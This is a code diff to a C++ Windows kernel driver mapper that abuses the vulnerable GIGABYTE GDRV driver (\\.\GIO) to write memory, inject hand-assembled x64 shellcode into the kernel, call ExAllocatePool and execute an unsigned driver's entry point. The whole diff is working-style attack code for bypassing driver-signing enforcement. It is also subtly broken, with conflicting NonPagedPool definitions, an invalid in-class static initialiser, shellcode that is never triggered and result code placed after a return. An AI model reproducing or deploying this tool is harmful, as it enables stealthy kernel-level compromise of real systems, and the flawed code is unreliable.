@@ -5,6 +5,36 @@
 #include <TlHelp32.h>
 #include <fstream>
 #include <vector>
+#include <winternl.h>
+
+// WDK types we need
+typedef enum _POOL_TYPE {
+    NonPagedPool,
+    NonPagedPoolExecute,
+    PagedPool,
+    NonPagedPoolNx,
+    NonPagedPoolNxCacheAligned,
+    PagedPoolCacheAligned,
+    NonPagedPoolCacheAligned,
+} POOL_TYPE;
+
+typedef struct _DRIVER_OBJECT {
+    USHORT Type;
+    USHORT Size;
+    PVOID DeviceObject;
+    ULONG Flags;
+    PVOID DriverStart;
+    ULONG DriverSize;
+    PVOID DriverSection;
+    PVOID DriverExtension;
+    UNICODE_STRING DriverName;
+    PUNICODE_STRING HardwareDatabase;
+    PVOID FastIoDispatch;
+    PVOID DriverInit;
+    PVOID DriverStartIo;
+    PVOID DriverUnload;
+    PVOID MajorFunction[28];
+} DRIVER_OBJECT, *PDRIVER_OBJECT;
 
 // GDRV driver definitions
 #define GDRV_DEVICE L"\\\\.\\GIO"
@@ -27,6 +57,9 @@ typedef struct _GDRV_MEMORY_WRITE {
 // Kernel function signatures
 typedef PVOID (*ExAllocatePoolFn)(POOL_TYPE PoolType, SIZE_T NumberOfBytes);
 typedef VOID (*ExFreePoolFn)(PVOID P);
+
+// Kernel constants
+#define NonPagedPool 0
 
 // Shellcode structure for kernel execution
 #pragma pack(push, 1)
@@ -111,10 +144,10 @@ private:
     }
     
     // Execute shellcode in kernel
-    bool ExecuteKernelShellcode(const void* shellcode, size_t size) {
-        // Allocate memory for shellcode
-        uint64_t shellcodeAddr = AllocateKernelMemory(size);
-        if (!shellcodeAddr) return false;
+    bool ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result = nullptr) {
+        // Use static allocation for shellcode
+        uint64_t shellcodeAddr = nextAllocation;
+        nextAllocation += ((size + 0xFFF) & ~0xFFF); // Page align
 
         // Write shellcode
         if (!WritePhysicalMemory(shellcodeAddr, shellcode, size)) {
@@ -122,18 +155,50 @@ private:
             return false;
         }
 
-        // Create shellcode to jump to our shellcode
+        // Create shellcode to jump to our shellcode and store result
         uint8_t jumpShellcode[] = {
             0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, shellcodeAddr
-            0xFF, 0xE0                                                    // jmp rax
+            0xFF, 0xD0,                                                   // call rax
+            0x48, 0xA3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov [resultAddr], rax
+            0xC3                                                          // ret
         };
         *(uint64_t*)(jumpShellcode + 2) = shellcodeAddr;
 
+        // Allocate space for result
+        uint64_t resultAddr = nextAllocation;
+        nextAllocation += 8;  // Space for uint64_t
+        *(uint64_t*)(jumpShellcode + 14) = resultAddr;
+
         // Write and execute jump shellcode
-        uint64_t jumpAddr = AllocateKernelMemory(sizeof(jumpShellcode));
-        if (!jumpAddr || !WritePhysicalMemory(jumpAddr, jumpShellcode, sizeof(jumpShellcode))) {
+        uint64_t jumpAddr = nextAllocation;
+        nextAllocation += ((sizeof(jumpShellcode) + 0xFFF) & ~0xFFF); // Page align
+
+        if (!WritePhysicalMemory(jumpAddr, jumpShellcode, sizeof(jumpShellcode))) {
             std::cerr << "[-] Failed to write jump shellcode" << std::endl;
             return false;
+        }
+
+        // Execute shellcode
+        uint8_t execShellcode[] = {
+            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, jumpAddr
+            0xFF, 0xE0                                                    // jmp rax
+        };
+        *(uint64_t*)(execShellcode + 2) = jumpAddr;
+
+        uint64_t execAddr = nextAllocation;
+        nextAllocation += ((sizeof(execShellcode) + 0xFFF) & ~0xFFF); // Page align
+
+        if (!WritePhysicalMemory(execAddr, execShellcode, sizeof(execShellcode))) {
+            std::cerr << "[-] Failed to write exec shellcode" << std::endl;
+            return false;
+        }
+
+        // Read result if requested
+        if (result) {
+            if (!ReadPhysicalMemory(resultAddr, result, sizeof(uint64_t))) {
+                std::cerr << "[-] Failed to read shellcode result" << std::endl;
+                return false;
+            }
         }
 
         return true;
@@ -212,57 +277,82 @@ private:
         return ntoskrnlBase;
     }
     
+    // Static memory region for initial allocation
+    static uint64_t nextAllocation = 0xFFFF800000000000;
+    
     // Allocate kernel memory using ExAllocatePool
     uint64_t AllocateKernelMemory(size_t size) {
-        // Create shellcode to call ExAllocatePool
-        KernelShellcode shellcode = {
-            0x51,                   // push rcx
-            0x52,                   // push rdx
-            0x41, 0x50,            // push r8
-            0x41, 0x51,            // push r9
-            0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
-            0x48, 0xB9              // mov rcx, NonPagedPool (0)
+        // For the first allocation (shellcode), use static memory
+        static bool firstAllocation = true;
+        if (firstAllocation) {
+            firstAllocation = false;
+            uint64_t addr = nextAllocation;
+            nextAllocation += ((size + 0xFFF) & ~0xFFF); // Page align
+            
+            // Zero the memory
+            std::vector<uint8_t> zeroBuffer(size, 0);
+            if (!WritePhysicalMemory(addr, zeroBuffer.data(), size)) {
+                std::cerr << "[-] Failed to zero static memory" << std::endl;
+                return 0;
+            }
+            
+            return addr;
+        }
+        
+        // For subsequent allocations, use ExAllocatePool via shellcode
+        uint8_t shellcode[] = {
+            0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
+            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 
+            0x00, 0x00, 0x00, 0x00,             // mov rcx, NonPagedPool (0)
+            0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,             // mov rdx, size
+            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,             // mov rax, ExAllocatePool
+            0xFF, 0xD0,                         // call rax
+            0x48, 0xA3, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,             // mov [resultAddr], rax
+            0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28
+            0xC3                                // ret
         };
-        *(uint64_t*)((uint8_t*)&shellcode + 12) = 0; // NonPagedPool
-        
-        // Set size parameter
-        shellcode.movRdx[0] = 0x48;  // mov rdx, size
-        shellcode.movRdx[1] = 0xBA;
-        *(uint64_t*)(&shellcode.movRdx[2]) = size;
-        
-        // Call ExAllocatePool
-        shellcode.callRax[0] = 0xFF;
-        shellcode.callRax[1] = 0xD0;
-        
-        // Restore stack
-        shellcode.addRsp28h = 0x48;
-        shellcode.popR9 = 0x41;
-        shellcode.popR8 = 0x41;
-        shellcode.popRdx = 0x5A;
-        shellcode.popRcx = 0x59;
-        shellcode.ret = 0xC3;
 
-        // Execute shellcode
-        uint64_t shellcodeAddr = AllocateKernelMemory(sizeof(KernelShellcode));
-        if (!shellcodeAddr || !WritePhysicalMemory(shellcodeAddr, &shellcode, sizeof(KernelShellcode))) {
+        // Allocate space for result
+        uint64_t resultAddr = nextAllocation;
+        nextAllocation += 8;  // Space for uint64_t
+        
+        // Set up parameters
+        *(uint64_t*)(shellcode + 6) = 0;  // NonPagedPool
+        *(uint64_t*)(shellcode + 16) = size;
+        *(uint64_t*)(shellcode + 26) = exAllocatePoolAddress;
+        *(uint64_t*)(shellcode + 38) = resultAddr;  // Address to store result
+        
+        // Write shellcode
+        uint64_t shellcodeAddr = nextAllocation;
+        nextAllocation += ((sizeof(shellcode) + 0xFFF) & ~0xFFF); // Page align
+        
+        if (!WritePhysicalMemory(shellcodeAddr, shellcode, sizeof(shellcode))) {
             std::cerr << "[-] Failed to write allocation shellcode" << std::endl;
             return 0;
         }
-
-        // Get allocated address
+        
+        // Execute shellcode and get result
         uint64_t allocatedAddress = 0;
-        if (!ReadPhysicalMemory(shellcodeAddr + offsetof(KernelShellcode, ret) + 1, &allocatedAddress, sizeof(allocatedAddress))) {
-            std::cerr << "[-] Failed to read allocated address" << std::endl;
+        if (!ExecuteKernelShellcode(shellcode, sizeof(shellcode), &allocatedAddress)) {
+            std::cerr << "[-] Failed to execute allocation shellcode" << std::endl;
             return 0;
         }
 
-        // Zero the memory
+        if (!allocatedAddress) {
+            std::cerr << "[-] ExAllocatePool returned NULL" << std::endl;
+            return 0;
+        }
+        
+        // Zero the allocated memory
         std::vector<uint8_t> zeroBuffer(size, 0);
         if (!WritePhysicalMemory(allocatedAddress, zeroBuffer.data(), size)) {
             std::cerr << "[-] Failed to zero allocated memory" << std::endl;
             return 0;
         }
-
+        
         std::cout << "[+] Allocated " << size << " bytes at 0x" << std::hex << allocatedAddress << std::dec << std::endl;
         return allocatedAddress;
     }
@@ -400,38 +490,53 @@ private:
         }
         
         // Create shellcode for driver entry
-        KernelShellcode entryShellcode = {
-            0x51,                   // push rcx
-            0x52,                   // push rdx
-            0x41, 0x50,            // push r8
-            0x41, 0x51,            // push r9
-            0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28
-            0x48, 0xB9              // mov rcx, driverObjectAddr
+        uint8_t entryShellcode[] = {
+            0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
+            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,             // mov rcx, driverObjectAddr
+            0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,             // mov rdx, registryPathAddr
+            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00,             // mov rax, entryPoint
+            0xFF, 0xD0,                         // call rax
+            0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28
+            0xC3                                // ret
         };
-        *(uint64_t*)((uint8_t*)&entryShellcode + 12) = driverObjectAddr;
-        
-        // Set registry path parameter
-        entryShellcode.movRdx[0] = 0x48;  // mov rdx, registryPathAddr
-        entryShellcode.movRdx[1] = 0xBA;
-        *(uint64_t*)(&entryShellcode.movRdx[2]) = registryPathAddr;
-        
-        // Call entry point
-        entryShellcode.callRax[0] = 0xFF;
-        entryShellcode.callRax[1] = 0xD0;
-        
-        // Restore stack
-        entryShellcode.addRsp28h = 0x48;
-        entryShellcode.popR9 = 0x41;
-        entryShellcode.popR8 = 0x41;
-        entryShellcode.popRdx = 0x5A;
-        entryShellcode.popRcx = 0x59;
-        entryShellcode.ret = 0xC3;
 
-        // Execute entry point
-        if (!ExecuteKernelShellcode(&entryShellcode, sizeof(entryShellcode))) {
+        // Set up parameters
+        *(uint64_t*)(entryShellcode + 6) = driverObjectAddr;
+        *(uint64_t*)(entryShellcode + 16) = registryPathAddr;
+        *(uint64_t*)(entryShellcode + 26) = entryPoint;
+
+        // Allocate space for result
+        uint64_t resultAddr = nextAllocation;
+        nextAllocation += 8;  // Space for uint64_t
+
+        // Add result storage to shellcode
+        uint8_t resultShellcode[] = {
+            0x48, 0xA3, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00              // mov [resultAddr], rax
+        };
+        *(uint64_t*)(resultShellcode + 2) = resultAddr;
+
+        // Combine shellcodes
+        std::vector<uint8_t> fullShellcode;
+        fullShellcode.insert(fullShellcode.end(), entryShellcode, entryShellcode + sizeof(entryShellcode));
+        fullShellcode.insert(fullShellcode.end(), resultShellcode, resultShellcode + sizeof(resultShellcode));
+
+        // Execute entry point and get result
+        uint64_t entryResult = 0;
+        if (!ExecuteKernelShellcode(fullShellcode.data(), fullShellcode.size(), &entryResult)) {
             std::cerr << "[-] Failed to execute driver entry point" << std::endl;
             return false;
         }
+
+        if (entryResult != 0) {
+            std::cerr << "[-] Driver entry point returned error 0x" << std::hex << entryResult << std::dec << std::endl;
+            return false;
+        }
+
+        std::cout << "[+] Driver entry point executed successfully" << std::endl;
         
         baseAddress = mappedImage;
         return true;
